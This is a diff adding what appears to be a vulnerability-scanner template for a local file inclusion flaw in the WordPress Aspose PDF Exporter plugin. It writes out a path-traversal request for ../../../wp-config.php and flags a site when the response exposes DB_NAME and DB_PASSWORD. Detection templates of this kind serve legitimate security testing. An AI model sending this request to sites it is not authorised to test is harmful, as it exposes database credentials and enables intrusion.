@@ -1,0 +1,28 @@
+id: aspose-pdf-file-download
+brief:
+    title: WordPress Aspose PDF Exporter - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: WordPress Aspose PDF Exporter is vulnerable to local file inclusion.
+    label:
+        - aspose
+        - packetstorm
+        - wordpress
+        - wp-plugin
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../wp-config.php'
+      signs:
+        - "on": word
+          has:
+            - DB_NAME
+            - DB_PASSWORD
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
